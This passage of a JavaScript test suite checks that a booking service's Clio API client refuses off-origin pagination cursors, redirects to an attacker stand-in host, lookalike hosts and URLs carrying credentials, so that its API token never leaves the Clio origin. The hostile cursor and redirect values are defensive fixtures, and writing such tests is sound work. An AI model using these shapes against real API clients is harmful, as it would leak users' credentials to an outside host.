    assert.deepEqual(stub.seen.entryPosts, []);
  });

  test('ON THE CUSTOM-FIELD WALK: a failed list, and the booking still completes', async () => {
    // That module's contract, in its own header: nothing there may fail a booking. A
    // refused redirect is an incomplete enumeration like any other.
    stub = stubAll({
      pages: [pageBody(filler(5))],
      cfPages: [JSON.stringify({ data: [], meta: { paging: { next: `${CLIO_CFIELDS}?page_token=p1` } } })],
      cfRedirects: { 1: EVIL_LOCATION },
    });
    const res = await bookWithIntake();

    assert.deepEqual(stub.seen.followed, []);
    assert.equal(stub.seen.requests.some((r) => r.host === EVIL_HOST), false);
    assert.equal(res.status, 201, 'the appointment is the product; a CRM field is not');
    assert.equal(stub.seen.entryPosts.length, 1);
    assert.ok(mute.saw('custom field list failed'), 'reported as a failed list');
    assertNoCredentialedEgress(stub.seen);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 4. TASK 5 — the two call sites still behave exactly as gated
// ─────────────────────────────────────────────────────────────────────────────
describe('the two nextPageUrl call sites are unchanged by the sink', () => {
  test('the CALENDAR still rethrows an off-origin cursor to a 502, with no write', async () => {
    // bfebc68's direction, restated with the sink in place. The sink must not have
    // absorbed the call-site refusal or changed which words it uses.
    stub = stubAll({
      pages: [pageBody(filler(PAGE_LIMIT), `https://${EVIL_HOST}/api/v4/calendar_entries?page_token=pwned`)],
    });
    const res = await book();

    assert.equal(res.status, 502);
    assert.equal((await res.json()).code, 'PROVIDER_ERROR');
    assert.ok(mute.saw('calendar read refused a next page cursor'), 'still the call site’s own words');
    assert.ok(mute.saw(`refused host ${EVIL_HOST}`));
    assert.deepEqual(stub.seen.entryPosts, [], 'no write onto a calendar we could not finish reading');
    assert.deepEqual(stub.seen.reads, [0]);
    assertNoCredentialedEgress(stub.seen);
  });

  test('the CUSTOM FIELDS still return false, and the booking still completes', async () => {
    stub = stubAll({
      pages: [pageBody(filler(5))],
      cfPages: [JSON.stringify({ data: [], meta: { paging: { next: `https://${EVIL_HOST}/x` } } })],
    });
    const res = await bookWithIntake();

    assert.equal(res.status, 201);
    assert.ok(mute.saw('custom field list refused a next page cursor'), 'still that module’s own words');
    assert.ok(mute.saw('custom field list failed'), 'and still a FAILED list, not a thrown booking');
    assert.equal(stub.seen.entryPosts.length, 1);
    assertNoCredentialedEgress(stub.seen);
  });

  test('…and the intake NOTE still carries the answers when the fields are refused', async () => {
    // The reason degrading silently there is acceptable at all: the data is never
    // lost, only its structured copy. If this stops being true, the custom-field
    // module's whole fail-open contract stops being defensible.
    stub = stubAll({
      pages: [pageBody(filler(5))],
      cfPages: [JSON.stringify({ data: [], meta: { paging: { next: `https://${EVIL_HOST}/x` } } })],
    });
    await bookWithIntake();

    assert.equal(stub.seen.notes.length, 1, 'the note was written');
    const detail = stub.seen.notes[0].data.detail;
    assert.ok(detail.includes('Perch intake'), 'and carries the qualifier summary');
    assert.ok(detail.includes('Real estate'), 'including the answers the custom fields would have held');
  });

  test('a redirected calendar walk lands on the SAME 502 as a refused cursor', async () => {
    // Two different facts, one fail-closed direction. The route must not have gained
    // a new answer for the new refusal.
    stub = stubAll({ pages: [pageBody(filler(PAGE_LIMIT), 1)], entryRedirects: { 1: EVIL_LOCATION } });
    const res = await book();

    assert.equal(res.status, 502);
    assert.equal((await res.json()).code, 'PROVIDER_ERROR');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 5. The sink assertion itself, exercised directly
// ─────────────────────────────────────────────────────────────────────────────
describe('assertClioOrigin is the sink check, and it is one test', () => {
  test('a URL on the Clio origin passes', () => {
    for (const u of [CLIO_BASE, `${CLIO_BASE}/calendar_entries?x=1`, CLIO_TOKEN, CLIO_ORIGIN]) {
      assert.doesNotThrow(() => assertClioOrigin(u, 'GET request'), `passes: ${u}`);
    }
  });

  test('every off-origin shape throws, naming the host', () => {
    for (const [u, needle] of [
      [`https://${EVIL_HOST}/x`, `refused host ${EVIL_HOST}`],
      [`https://${LOOKALIKE_HOST}/x`, `refused host ${LOOKALIKE_HOST}`],
      ['http://app.clio.com/x', 'refused host app.clio.com'],
      ['https://app.clio.com:8443/x', 'refused host app.clio.com:8443'],
    ]) {
      assert.throws(() => assertClioOrigin(u, 'GET request'), (e) => e.message.includes(needle), `refused: ${u}`);
    }
  });

  test('a non-absolute target is refused, and there is no host to name', () => {
    assert.throws(() => assertClioOrigin('/api/v4/x', 'GET request'), /not absolute/);
    assert.throws(() => assertClioOrigin(undefined, 'GET request'), /not absolute/);
  });

  test('URL credentials are refused even on the right origin', () => {
    assert.throws(() => assertClioOrigin('https://u:p@app.clio.com/x', 'GET request'), /carrying credentials/);
  });

  test('the `where` label reaches the message, so two requests are told apart', () => {
    assert.throws(() => assertClioOrigin(`https://${EVIL_HOST}/x`, 'GET request'), /GET request/);
    assert.throws(() => assertClioOrigin(`https://${EVIL_HOST}/x`, 'PATCH request'), /PATCH request/);
  });
});
